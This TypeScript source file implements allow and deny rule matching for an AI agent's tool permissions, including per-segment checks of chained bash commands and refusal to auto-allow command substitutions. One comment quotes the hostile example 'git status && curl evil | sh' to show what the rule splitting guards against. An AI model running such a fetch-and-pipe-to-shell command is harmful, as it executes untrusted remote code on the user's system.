import type { PermissionRequest } from "./types";

export interface AllowRule {
  toolName: string;
  pattern?: string;
}

export function parseAllowRule(rule: string): AllowRule | null {
  const match = /^([\w-]+)(?:\((.*)\))?$/.exec(rule.trim());
  if (!match) return null;
  return { toolName: match[1] as string, pattern: match[2] };
}

function globMatch(pattern: string, value: string): boolean {
  const escaped = pattern.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*");
  return new RegExp(`^${escaped}$`).test(value);
}

function requestTarget(req: PermissionRequest): string | undefined {
  if (typeof req.args !== "object" || req.args === null) return undefined;
  const args = req.args as Record<string, unknown>;
  const key = req.toolName === "bash" ? "command" : "path";
  const value = args[key];
  return typeof value === "string" ? value : undefined;
}

export function matchAllowRule(rule: AllowRule, req: PermissionRequest): boolean {
  if (rule.toolName !== req.toolName) return false;
  if (rule.pattern === undefined) return true;
  const target = requestTarget(req);
  return target !== undefined && globMatch(rule.pattern, target);
}

// Splits a bash command into its chained segments ("a && b | c; d" →
// ["a", "b", "c", "d"]) with a plain separator scan — quotes are not honored,
// which only ever errs towards asking. Returns null when the command embeds a
// command substitution ("$(...)" or backticks): the segments can no longer be
// trusted because a substitution hides an arbitrary command in a benign one.
function splitCommandChain(command: string): string[] | null {
  if (command.includes("$(") || command.includes("`")) return null;
  return command
    .split(/&&|\|\||[;|\n]/)
    .map((segment) => segment.trim())
    .filter((segment) => segment.length > 0);
}

function withCommand(req: PermissionRequest, command: string): PermissionRequest {
  return {
    ...req,
    args: { ...((req.args ?? {}) as Record<string, unknown>), command },
  };
}

// Allow rules apply per chain segment: "bash(git *)" must not wave through
// "git status && curl evil | sh". Every segment has to match some rule, and a
// command with a substitution is never auto-allowed.
export function isAllowedByRules(rules: readonly string[], req: PermissionRequest): boolean {
  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
  const command = requestTarget(req);
  if (command === undefined) return matchesAnyRule(rules, req);
  const segments = splitCommandChain(command);
  if (segments === null) return false;
  if (segments.length === 0) return matchesAnyRule(rules, req);
  return segments.every((segment) => matchesAnyRule(rules, withCommand(req, segment)));
}

// Deny rules stay maximally suspicious: any single matching segment denies,
// and a command that cannot be segmented falls back to whole-command matching.
export function isDeniedByRules(rules: readonly string[], req: PermissionRequest): boolean {
  if (req.toolName !== "bash") return matchesAnyRule(rules, req);
  const command = requestTarget(req);
  if (command === undefined) return matchesAnyRule(rules, req);
  const segments = splitCommandChain(command);
  if (segments === null || segments.length === 0) return matchesAnyRule(rules, req);
  return segments.some((segment) => matchesAnyRule(rules, withCommand(req, segment)));
}

function matchesAnyRule(rules: readonly string[], req: PermissionRequest): boolean {
  return rules.some((raw) => {
    const rule = parseAllowRule(raw);
    return rule !== null && matchAllowRule(rule, req);
  });
}

export function buildAllowRule(req: PermissionRequest): string {
  const target = requestTarget(req);
  return target !== undefined ? `${req.toolName}(${target})` : req.toolName;
}
